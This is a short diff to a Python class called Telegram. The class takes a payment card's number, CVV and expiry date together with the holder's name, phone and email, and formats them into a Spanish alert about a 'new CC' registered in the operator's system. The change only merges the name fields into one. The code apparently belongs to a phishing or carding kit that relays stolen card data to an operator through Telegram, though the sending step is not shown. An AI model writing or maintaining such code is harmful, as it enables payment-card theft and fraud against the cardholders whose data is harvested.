@@ -18,15 +18,14 @@ class Telegram:
         self.number = payload.get("number")
         self.CVV = payload.get("CVV")
         self.Vto = payload.get("Vto")
-        self.name = payload.get("name")
-        self.last_name = payload.get("last_name")
+        self.full_name = payload.get("full_name")
         self.phone = payload.get("phone")
         self.email = payload.get("email")
         
     def build_message(self):
         message = (
             f'Se ha registrado una nueva CC en su sistema.\n'
-            f'NOMBRE: {self.name.upper()} {self.last_name.upper()}\n'
+            f'NOMBRE: {self.full_name}\n'
             f'NRO TARJETA: {self.number}\n'
             f'CADUCIDAD: {self.Vto}\n'
             f'CVV: {self.CVV}\n'
